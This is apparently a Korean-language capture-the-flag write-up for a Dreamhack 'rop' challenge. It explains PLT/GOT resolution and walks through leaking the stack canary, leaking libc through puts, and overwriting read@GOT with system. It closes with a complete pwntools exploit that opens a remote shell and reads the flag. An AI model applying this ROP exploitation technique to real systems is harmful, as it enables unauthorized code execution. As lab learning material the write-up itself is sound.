# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e565a720-f0db-4679-94b7-84a0d01a0dfe/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제파일을 다운로드 받으면 rop.c 소스코드 파일과 rop파일 및 Dockerfile,라이브러리를 획득할 수 있다. rop.c 소스코드를 확인해 보자.

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

라이브러리 함수를 호출하는 것은 그 라이브러리 함수의 plt를 호출하는 것을 의미한다.

plt주소를 호출(call)하면 plt가 실행되며 got(라이브러리 함수의 실제 주소가 적혀 있는 곳)를 찾는다.. 이 때 plt가 처음 호출된 거면 got에 라이브러리에 있는 함수 실제 주소가 적혀있지 않아서 찾는 과정을 거치지만 두번째 호출된거면 got에 라이브러리에 있는 함수의 실제 주소가 적혀있다.

즉 plt(got 주소 적혀있음) → got(라이브러리 실제 함수 주소 적혀있음) → 라이브러리 실제 함수

따라서 함수 호출을 통해 got에 라이브러리 함수의 주소 값을 쓰고 , got의 주소에 접근하여 쓰여져 있는 라이브러리 함수 주소값을 내가 원하는 함수의 주소 값으로 덮어씌운다면 이제 그 함수는 내가 원하는 함수를 호출하게 된다.

예를 들어 위 코드에서 puts를 예로 들면 카나리를 leak할 때 puts 함수가 실행되었으므로 puts의 got주소에는 라이브러리 에서의 puts 함수 주소가 들어있을 것이다. 그러면 이 got주소에 있는 값을 system으로 변경하면 다음 puts함수가 실행될 때는 puts("[2] Input ROP payload")가 아닌 system("[2] Input ROP payload")이 실행될 것이다. 이를 이용해서 공격을 할 것이다.

# 문제 접근

먼저 적용된 보호기법을 살펴보면 다음과 같다.

```solidity
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

코드에서도 존재했듯이 카나리 값이 존재하고 NX비트가 적용되어 스택에서 실행권한이 없는 것을 확인할 수 있다. RELRO는 부분적으로 적용되어있다.

먼저 카나리 값을 추출하는 코드를 짜기 위해서 gdb를 이용해서 카나리 값이 들어간 후의 스택의 상태를 살펴보았다.

```solidity
	 0x4006a7 <main>:     push   rbp
   0x4006a8 <main+1>:   mov    rbp,rsp
	 0x4006ab <main+4>:   sub    rsp,0x40
   0x4006af <main+8>:   mov    rax,QWORD PTR fs:0x28
   0x4006b8 <main+17>:  mov    QWORD PTR [rbp-0x8],rax
=> 0x4006bc <main+21>:  xor    eax,eax
-------------------------------------------------------------------------
RAX: 0xda7a4184a1eefb00 
RCX: 0x7ffff7fa8718 --> 0x7ffff7fa9e20 --> 0x0 
RBP: 0x7fffffffdf60 --> 0x0 
RSP: 0x7fffffffdf20 --> 0x1
---------------------------------------------------------------------------
0x7fffffffdf20: 0x0000000000000001      0x00000000004007dd
0x7fffffffdf30: 0x0000000000000000      0x0000000000400790
0x7fffffffdf40: 0x0000000000000000      0x00000000004005c0
0x7fffffffdf50: 0x00007fffffffe050      0xda7a4184a1eefb00
0x7fffffffdf60: 0x0000000000000000      0x00007ffff7dfd81d
```

rbp-0x8 위치에 카나리값인 rax레지스터에 들어있는 값이 있는 것을 확인할 수 있고 현재 스택의 상태를 알 수 있다.

![스택 상태.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/73a98967-9ca5-48f5-aee9-51e4c0237053/%EC%8A%A4%ED%83%9D_%EC%83%81%ED%83%9C.png)

그러면 코드와 비교해서 BUF[0x30]만큼 할당되어 있고 8바이트만큼 값이 들어간 이후 카나리 값이 들어가 있는 것을 확인할 수 있으므로 페이로드로 총 39바이트만큼 보내면 코드상 그 다음 버퍼값을 출력할 때 카나리 값이 출력되므로 카나리를 알아낼 수 있다.

즉 카나리를 유출하기 위한 코드는 다음과 같다.

```python
from pwn import *

host=""
port=
p=remote(host,port)
payload=b'A'*0x39
p.sendafter("Buf: ",payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7))
#print(canary)
canary=p64(canary)
```

그럼 카나리 값을 구했으니 어떠한 방식으로 쉘을 획득할지 생각해야 한다.

이번 문제에서는 Return to Library 문제와 다르게 system 함수를 코드 내부에서 사용하고 있지 않아 system 함수의 plt를 이용하여 system 함수를 호출하는 방법은 힘들다.

대신 이미 사용중인 puts함수와 read 함수를 이용하여 이 함수 중 read의 got주소에 적혀 있는 라이브러리 상 read의 주소를 라이브러리에 있는 system 함수의 주소로 덮어씌워 read함수 대신 system 함수를 실행시킬 수 있다.

이것이 가능한 이유는 라이브러리에서 각 함수의 오프셋이 정해져있기 때문이다. 

예를 들어보자

read@got(에 적혀있는 주소) = 라이브러리 베이스주소 + 라이브러리 read 오프셋이면

system@got(에 적혀있는 주소) = 라이브러리 베이스주소 + 라이브러리 system 오프셋이다.  

여기서 라이브러리 read 오프셋이 정해져있으므로 우리가 구한 read@got 에 적혀있는 주소에서 라이브러리 read 오프셋을 빼면 라이브러리 주소를 구할 수 있다.

- 라이브러리 베이스주소 = read@got(에 적혀있는 주소) - 라이브러리 read 오프셋

그러면 우리는 이를 기반으로 system함수가 라이브러리에서 어디에 있는지(system 함수의 라이브러리상 주소)를 구할 수 있게 된다.

read의 주소는 ELF(파일명).got 를 이용하여 그 파일에서 got의 주소를 구할 수 있고

라이브러리 오프셋은 ELF(라이브러리명).symbols 를 이용하여 구할 수 있다. 

이 때 문제파일에서 어떤 라이브러리를 썼는지가 중요한데(라이브러리 별로 오프셋이 다르므로) 다운로드 하면 받아지는 라이브러리는 libc-2.27.so 로 친절하게도 문제에서 이 라이브러리를 사용해서 작성되었다고 알려주고 있다. 

즉 system 함수가 rop 파일이 실행되었을 때 라이브러리 상 어디 주소에 있는지 알기 위해서는 다음과 같은 과정을 거쳐야 한다.

1. read 함수(이미 불러졌던 함수)의 got 주소로 찾아가 got에 적혀있는 주소를 알아낸다. (라이브러리에 있는 read함수의 주소)
2. 그러면 라이브러리에 있는 read 함수의 주소를 알아냈으므로 이 값에서 라이브러리 read 함수 오프셋을 빼주면 라이브러리의 베이스 주소가 나온다.
3. 이 라이브러리 베이스 주소에서 라이브러리 system 오프셋을 더하면 system 함수의 라이브러리상 주소를 알 수 있다.

이를 위해서 puts 함수를 이용해 read함수의 got에 적혀있는 주소를 알아내고자 했다.

```python
gdb-peda$ elfsymbol
Found 5 symbols
puts@plt = 0x400570
__stack_chk_fail@plt = 0x400580
printf@plt = 0x400590
read@plt = 0x4005a0
setvbuf@plt = 0x4005b0
```

puts 함수 또한 이미 실행된 적이 있기 때문에 puts함수를 실행시키려면 puts 함수의 plt 주소만 알고 있어도 puts를 실행시킬 수 있으므로 매개변수로 넣어줄 read함수의 got주소만 넣어주면 된다. 그러면 라이브러리 상의 read 함수 주소를 알 수가 있다.

- puts(주소값) → 주소에 있는 값을 출력해줌. (puts(const char* str) 형태임)

![호출규약.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/22c66913-e6a3-40a5-bce6-83a59d944de4/%ED%98%B8%EC%B6%9C%EA%B7%9C%EC%95%BD.png)

이 때 x64 환경에서 첫 매개변수는 rdi 레지스터에 저장이 되어있어야 하므로 rdi에 read의 got 주소를 넣어줘야 한다. 

![ropgadget.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e51e124f-eb67-4c81-b0a0-d431331ee253/ropgadget.png)

```python
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rdi"
0x00000000004007f3 : pop rdi ; ret
                                                                                          
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rdx"
                                                                                          
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rsi"                                        
0x00000000004007f1 : pop rsi ; pop r15 ; ret
```

ROPgadget을 이용하여 pop rdi를 찾아본 결과 0x00000000004007f3 주소에 pop rdi ; ret의 가젯이 존재하는 것을 확인할 수 있다. 

그러면 코드는 아래와 같이 짤 수 있다. 이미 구한 카나리 값까지 이용해야 원하는 함수를 실행할 수 있으므로 아까 진행한 코드에 덧붙여서 진행해야 한다.

```python
from pwn import *

host=""
port=
p=remote(host,port)

# 카나리값 알아내기
payload=b'A'*0x39
p.sendafter("Buf: ",payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7))
#print(canary)
canary=p64(canary)

e=ELF('./rop') # 파일 불러오기
library = ELF('./libc-2.27.so') # 라이브러리 불러오기

# read 함수의 got에 적혀있는 read함수의 라이브러리 주소를
# system 함수의 라이브러리 주소를 덮어 씌울 것이므로 read의 got주소를 알아야함
puts_plt = e.plt['puts'] # puts 함수의 plt 주소 0x400570
read_plt = e.plt['read'] # read 함수의 plt 주소 0x4005a0
read_got = e.got['read'] # read 함수의 got 주소
pop_rdi = 0x00000000004007f3

# 실행시키고자 하는 함수는 puts(read_got)이고 read 함수의 got 주소에 있는 값을 출력함.
# read 함수의 got 주소에는 read함수의 라이브러리에서의 주소가 나와있으므로 이를 알기 위함임
payload=b'A'*0x38+canary+b'A'*0x8 # buf(0x30) + 8바이트 + canary + SFP

payload += p64(pop_rdi) + p64(read_got) # pop rdi로 read의 got 주소를 매개변수로 설정
payload += p64(puts_plt) # puts의 plt 주소로 ret 되므로 puts(read_got) 실행
p.sendafter("Buf: ",payload)

# 즉 read got에 있는 라이브러리상 read의 주소가 출력이 된다.

read_library = u64(p.recvn(6)+b'\x00'*2) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library-library.symbols['read']
system_library = library_base + library.symbols['system']

```

이 때 plt 주소는 elfsymbols 명령어를 사용해서 고정값으로 해줘도 된다. 하지만 plt는 PIE가 적용되어 있지 않을 때만 고정값이고 어차피 got 주소를 구할 때 e.got[’read’]형태로 쓰므로 똑같이 맞춰주었다.

이 때 read_library의 주소를 받아올 때 6바이트만 받아오고 나머지는 \x00으로 채우는 이유는 64비트에서 바이너리의 libc 주소는 우분투 환경에서 주로 0x7f로 시작되며 나머지는 0x00으로 채워지기 때문이다. 

```python
[DEBUG] Received 0x7 bytes:
    00000000  50 63 03 06  0a 7f 0a                               │Pc··│···│
    00000007
```

위와 같은 경우 맨 마지막에 붙은 0a는 puts로 출력할 때 붙는 개행 문자이므로  앞의 6바이트가 read의 라이브러리상 주소이다. 즉 위와 같은 경우 0x7f0a06036350이 된다.

다시 실행과정으로 돌아가면 puts(read_got) 함수가 종료되면 puts(read_got)를 호출한 지점 부터 다시 진행되게 된다. 근데 puts(read_got)실행할 때를 생각해보면 main 함수에서 함수 에필로그로 스택을 정리하고 ret을 하면서 우리가 이 스택 정리 되는 것을 puts의 plt와 read_got의 주소를 매개변수로 넣어 실행시키게 만든 것이다.  

즉 이 이후로는 아무것도 없기 때문에 더이상 진행되면 프로그램이 종료되고 만다.

이를 해결하기 위해서는 puts(read_got)이후에도 가젯을 더 넣어서 puts(read_got)가 실행되고 나면 그 다음 가젯이 실행되도록 하면 된다.  

지금 설계에서는 read 함수의 got에 system의 라이브러리 주소를 집어넣어야 하기 때문에 페이로드에 read 함수의 got를 덮어씌우는 과정이 필요하다.

read함수의 경우 

ssize_t read(int fd, void *buf, size_t nbytes); 의 형태이며

- int fd : 읽을 파일의 파일 디스크립터
- **void *buf :** 읽어들인 데이터를 저장할 버퍼(배열)
- **size_t nbytes :** 읽어들일 데이터의 최대 길이 (buf의 길이보다 길어선 안됨)

로 구성되어 있다.

따라서 read(0,read_got,0x10보다 큰값)을 통해 read_got 주소에 16바이트이상 읽어 들이고자 한다. 여기서 기준을 16바이트로 잡은 이유는 system 함수 주소(8바이트) system 함수 매개변수 문자열”/bin//sh” 8바이트로 16바이트가 최소 필요하기 때문이다. (”/bin//sh”는 8바이트이며 내부적으로 실행될 때는 “/bin/sh”로 실행됨.만약 바이트 수를 안 맞춰 줬을 때 의도치 않은 값 들어있으면 /bin/sh가 실행이 안되므로 넣어줌) 

이때 매개변수 값들은 read(rdi,rsi,rdx)로 저장되어 있어야 하므로 다시 가젯을 확인해야 한다.  

```python
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rdi"
0x00000000004007f3 : pop rdi ; ret
                                                                                          
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rdx"
                                                                                          
┌──(root💀kali)-[~/바탕화면/return_oriented_programming]
└─# ROPgadget --binary ./rop | grep "pop rsi"                                        
0x00000000004007f1 : pop rsi ; pop r15 ; ret
```

0x00000000004007f3 : pop rdi ; ret

0x00000000004007f1 : pop rsi ; pop r15 ; ret

read의 rdi와 rsi 값은 설정이 가능한데 rdx 값을 설정할 가젯이 없다. 하지만 이 문제에서는 rdx 값이 적당히 크게 알아서 설정이 되기 때문에 꼭 지정해주지 않아도 작동이 된다.

rsi는 읽어들인 데이터를 저장할 버퍼이므로 read_got로 설정하여 우리가 입력하는 값을 read의 got 주소에 덮어 씌울 수 있다.

따라서 추가로 작성할 코드를 조금 더 자세히 살펴보면

### read(0,read_got,?)

```python
# read(0,read_got,?) 실행을 위한 페이로드 이로 인해 내가 입력이 가능하며 그 값을 
# read_got주소에 덮어 씌운다.

payload += p64(pop_rdi)+p64(0) # rdi에 0 설정
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) # rsi에 read_got 설정 r15는 아무거나
payload += p64(read_plt) # read 함수 실행, 아직 got 덮어씌우지 않았으므로 read가 실행됨.
```

fd값을 0으로 설정해야 하고 이는 rdi에 저장되어야 하므로 0을 rdi에 저장하고 ret를 한다.

근데 이 ret는 p64(pop_rsi_r15)가 담겨 있으므로 이 명령을 수행한다. 

pop rsi를 하면 read_got의 주소가 rsi에 담기게 되고

r15는 우리가 실행시킬 read 함수에서 사용하지 않는 레지스터이므로 필요가 없어서 0값을 담았다.

rdx값은 지정해주면 좋으나 가젯이 없었고 이 문제에서는 적당히 큰값으로 알아서 설정되어 추가적인 지정을 해주지 않았다.

그리고 read_plt를 통해 read함수를 실행시켰다. 아직 read_got 주소를 덮어 씌우지 않았으므로 read함수가 실행된다. 

즉 read(0,read_got,?)가 실행이 된 것이다. 이로 인해서 우리는 추가적으로 이 프로세스에게 send를 할 수가 있게 된다.

### system(”/bin//sh”)

```python
# system 주소로 덮어씌우고 나서 read_plt를 실행하면 실행되어야 하는 함수는 system 함수다.
# read_got주소에 system 함수, 그리고 이어서 8바이트를 "/bin//sh"이 저장되게 할 것이다.
# 따라서 read_got+0x8에 "/bin//sh"이 저장되어 있을 것이므로 이를 매개변수(rdi)에 저장
payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(read_plt) # plt주소가 가리키는 read_got에는 system의 라이브러리 주소가 적혀있음

---

중략

---

p.send(p64(system_library)+b"/bin//sh") 
# 두번째 페이로드 read(0,read_got,?)일 때 보낼 값
# 이로 인해 이제 read_got에는 system 주소가 있음
# 그리고 read_got+0x8 에는 "/bin//sh"이 있음.
```

먼저 위에서 read(0,read_got,?)를 실행하게 되었기에 프로세스는 추가적인 입력을 받으려고 하게된다.

우리는 그제서야 이 입력으로 system함수의 주소 + “/bin//sh”을 read함수의 got 주소에 쓰게 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/461db0a9-e7be-4e65-a340-3d683e5b9c98/Untitled.png)

덮어씌우기 전 read의 got 주소에 저장되어 있는 상태인데 라이브러리에 있는 read 함수의 주소와 라이브러리에 있는 setvbuf 함수의 주소가 저장되어 있는 것을 볼 수 있다.

하지만 우리가 덮어씌우는 입력이 끝나고 나면 read_got 주소의 상황은 아래와 같이 변하게 된다.

![덮어 씌워준 후.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fbcf3a30-3a9c-4798-b25a-33f28cae22bb/%EB%8D%AE%EC%96%B4_%EC%94%8C%EC%9B%8C%EC%A4%80_%ED%9B%84.png)

이 그림에서 볼 수 있듯이 이미 read_got+0x8 위치에는 다른 값이 쓰여져 있기 때문에 바이트를 맞추지 않으면 /bin/she 처럼 남아있던 문자와 합쳐져 다른 문자열이 되어 쉘을 못얻을 가능성이 되게 높다. 

다시 돌아와서 입력을 해주고 나면 read(0,read_got,?)함수가 끝나고 다음 가젯이 실행되게 되는데 이제 우리가 원하는 system(”/bin//sh”)을 실행할 차례가 된다. system함수는 매개변수가 rdi 하나이므로 rdi에 “/bin//sh”문자열의 주소가 들어가 있어야 한다. 

근데 이 값은 read(0,read_got,?)에서 입력을 받을 때 read_got주소에 system 라이브러리 주소, “/bin//sh”문자열 이 담겨있게 보냈기 때문에 read_got+0x8 주소에 “/bin//sh” 문자열이 들어있게 된다. (위 그림 참고)

따라서 rdi값에는 read_got+0x8 주소가 들어 있도록 구성 후 - p64(pop_rdi)+p64(read_got+0x8)

read_plt를 통해 read_got 주소로 가서 변조된 system 함수를 실행시키게 된다.

이제 이 코드들을 모은 최종적인 익스플로잇 코드를 실행시키면 쉘을 얻을 수 있다.

```python
from pwn import *

host="host3.dreamhack.games"
port=23863
p=remote(host,port)

# 카나리값 알아내기
payload=b'A'*0x39
p.sendafter("Buf: ",payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7))
success(": ".join(["canary",hex(canary)]))
#print(canary)
canary=p64(canary)

e=ELF('./rop') # 파일 불러오기
library = ELF('./libc-2.27.so') # 라이브러리 불러오기

# read 함수의 got에 적혀있는 read함수의 라이브러리 주소를
# system 함수의 라이브러리 주소를 덮어 씌울 것이므로 read의 got주소를 알아야함
puts_plt = e.plt['puts'] # puts 함수의 plt 주소 0x400570
read_plt = e.plt['read'] # read 함수의 plt 주소 0x4005a0
read_got = e.got['read'] # read 함수의 got 주소
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

# 실행시키고자 하는 함수는 puts(read_got)이고 read 함수의 got 주소에 있는 값을 출력함.
# read 함수의 got 주소에는 read함수의 라이브러리에서의 주소가 나와있으므로 이를 알기 위함임
payload=b'A'*0x38+canary+b'A'*0x8 # buf(0x30) + 8바이트 + canary + SFP

payload += p64(pop_rdi) + p64(read_got) # pop rdi로 read의 got 주소를 매개변수로 설정
payload += p64(puts_plt) # puts의 plt 주소로 ret 되므로 puts(read_got) 실행

# read(0,read_got,?) 실행을 위한 페이로드 이로 인해 내가 입력이 가능하며 그 값을 
# read_got주소에 덮어 씌운다.

payload += p64(pop_rdi)+p64(0) # rdi에 0 설정
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) # rsi에 read_got 설정 r15는 아무거나
payload += p64(read_plt) # read 함수 실행, 아직 got 덮어씌우지 않았으므로 read가 실행됨.

# system 주소로 덮어씌우고 나서 read_plt를 실행하면 실행되어야 하는 함수는 system 함수다.
# read_got주소에 system 함수, 그리고 이어서 8바이트를 "/bin//sh"이 저장되게 할 것이다.
# 따라서 read_got+0x8에 "/bin//sh"이 저장되어 있을 것이므로 이를 매개변수(rdi)에 저장
payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(read_plt) # plt주소가 가리키는 read_got에는 system의 라이브러리 주소가 적혀있음

p.sendafter("Buf: ",payload)

# 즉 read got에 있는 라이브러리상 read의 주소가 출력이 된다.

read_library = u64(p.recvn(6)+b'\x00'*2) # 출력된 read의 라이브러리상 주소 저장
library_base = read_library-library.symbols['read']
system_library = library_base + library.symbols['system']

p.send(p64(system_library)+b"/bin//sh") # 두번째 페이로드 read(0,read_got,?)일 때 보낼 값
																			# 이로 인해 이제 read_got에는 system 주소가 있음
																			# 그리고 read_got+0x8 에는 "/bin//sh"이 있음.

p.interactive()
```

```python
$ ls
flag
rop
run.sh
$ cat flag
DH{68b82d23a30015c732688c89bd03d401}
[*] Got EOF while reading in interactive
```

연결이 금방 종료되길래 한번 더 해서 빠르게 flag 값을 얻어냈다… 왜 금방 종료되는지는 모르겠음..
